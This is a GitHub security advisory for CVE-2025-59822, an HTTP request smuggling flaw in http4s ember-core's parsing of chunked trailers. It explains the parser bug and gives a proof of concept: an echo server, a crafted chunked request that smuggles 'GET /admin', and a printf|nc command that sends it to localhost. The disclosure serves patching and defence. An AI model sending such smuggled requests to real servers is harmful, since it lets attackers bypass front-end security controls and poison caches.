# [M] Http4s vulnerable to HTTP Request Smuggling due to improper handling of HTTP trailer section

## Summary
Severity: Medium
Advisory: GHSA-wcwh-7gfw-5wrr
CVE: CVE-2025-59822
CWE: CWE-444
Ecosystem: Maven
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-09-23
Source: https://github.com/advisories/GHSA-wcwh-7gfw-5wrr
Type: github-advisory

## Affected
- Maven: `org.http4s:http4s-ember-core_2.12` — affected >=0 <0.23.31
- Maven: `org.http4s:http4s-ember-core_2.13` — affected >=0 <0.23.31
- Maven: `org.http4s:http4s-ember-core_3` — affected >=0 <0.23.31
- Maven: `org.http4s:http4s-ember-core_2.13` — affected >=1.0.0-M1 <1.0.0-M45
- Maven: `org.http4s:http4s-ember-core_3` — affected >=1.0.0-M1 <1.0.0-M45

## Details
### Summary
http4s is vulnerable to HTTP Request Smuggling due to improper handling of HTTP trailer section.
This vulnerability could enable attackers to:
- Bypass front-end servers security controls
- Launch targeted attacks against active users
- Poison web caches

Pre-requisites for the exploitation: the web appication has to be deployed behind a reverse-proxy that forwards trailer headers.

### Details
The HTTP chunked message parser, after parsing the last body chunk, calls `parseTrailers` (`ember-core/shared/src/main/scala/org/http4s/ember/core/ChunkedEncoding.scala#L122-142`).
This method parses the trailer section using `Parser.parse`, where the issue originates.

`parse` has a bug that allows to terminate the parsing before finding the double CRLF condition: when it finds an header line that **does not include the colon character**, it continues parsing with `state=false` looking for the header name till reaching the condition `else if (current == lf && (idx > 0 && message(idx - 1) == cr))` that sets `complete=true` even if no `\r\n\r\n` is  found.
```scala
if (current == colon) {
  state = true // set state to check for header value
  name = new String(message, start, idx - start) // extract name string
  start = idx + 1 // advance past colon for next start

  // TODO: This if clause may not be necessary since the header value parser trims
  if (message.size > idx + 1 && message(idx + 1) == space) {
    start += 1 // if colon is followed by space advance again
    idx += 1 // double advance index here to skip the space
  }
  // double CRLF condition - Termination of headers
} else if (current == lf && (idx > 0 && message(idx - 1) == cr)) { // <----- not a double CRLF check
  complete = true // completed terminate loop
}
```
The remainder left in the buffer is then parsed as another request leading to HTTP Request Smuggling.

### PoC

Start a simple webserver that echoes the received requests:
```scala
import cats.effect._
import cats.implicits._
import org.http4s._
import org.http4s.dsl.io._
import org.http4s.ember.server.EmberServerBuilder
import org.http4s.server.Router
import org.http4s.server.middleware.RequestLogger
import org.typelevel.log4cats.LoggerFactory
import org.typelevel.log4cats.slf4j.Slf4jFactory
import com.comcast.ip4s._

object ExploitServer extends IOApp {

  implicit val loggerFactory: LoggerFactory[IO] = Slf4jFactory.create[IO]

  val echoService: HttpRoutes[IO] = HttpRoutes.of[IO] {
    case req @ _ =>
      for {
        bodyStr <- req.bodyText.compile.string
        method = req.method.name
        uri = req.uri.toString()
        version = req.httpVersion.toString
        headers = req.headers.headers.map { header =>
          s"${header.name.toString.toLowerCase}: ${header.value}"
        }.mkString("\n")
        
        responseText = s"""$method $uri $version
$headers

$bodyStr

"""
        result <- Ok(responseText)
      } yield result
  }

  val httpApp = RequestLogger.httpApp(logHeaders = true, logBody = true)(
    Router("/" -> echoService).orNotFound
  )

  override def run(args: List[String]): IO[ExitCode] = {
    EmberServerBuilder
      .default[IO]
      .withHost(ipv4"0.0.0.0")
      .withPort(port"8080")
      .withHttpApp(httpApp)
      .build
      .use { server =>
        IO.println(s"Server started at http://0.0.0.0:8080") >> IO.never
      }
      .as(ExitCode.Success)
  }
}
```

`build.sbt`
```
ThisBuild / scalaVersion := "2.13.15"

val http4sVersion = "0.23.30"

lazy val root = (project in file("."))
  .settings(
    name := "http4s-echo-server",
    libraryDependencies ++= Seq(
      "org.http4s" %% "http4s-ember-server" % http4sVersion,
      "org.http4s" %% "http4s-dsl" % http4sVersion,
      "org.http4s" %% "http4s-circe" % http4sVersion,
      "ch.qos.logback" % "logback-classic" % "1.4.11",
      "org.typelevel" %% "log4cats-slf4j" % "2.6.0",
    )
  )
```

Send the following request:
```http
POST / HTTP/1.1
Host: localhost
Transfer-Encoding: chunked

2
aa
0
Test: smuggling
a
GET /admin HTTP/1.1
Host: localhost

```

You can do that with the following command:
`printf 'POST / HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunked\r\n\r\n2\r\naa\r\n0\r\nTest: smuggling\r\na\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n' | nc localhost 8080`

You will see that the request is interpreted as two separate requests
```
16:18:02.015 [io-compute-19] INFO org.http4s.server.middleware.RequestLogger -- HTTP/1.1 POST / Headers(Host: localhost, Transfer-Encoding: chunked) body="aa"
16:18:02.027 [io-compute-19] INFO org.http4s.server.middleware.RequestLogger -- HTTP/1.1 GET /admin Headers(Host: localhost)
```

## References
- https://github.com/http4s/http4s/security/advisories/GHSA-wcwh-7gfw-5wrr
- https://nvd.nist.gov/vuln/detail/CVE-2025-59822
- https://github.com/http4s/http4s/commit/dd518f7c967e5165813b8d4a48a82b8fab852d41
- https://github.com/http4s/http4s
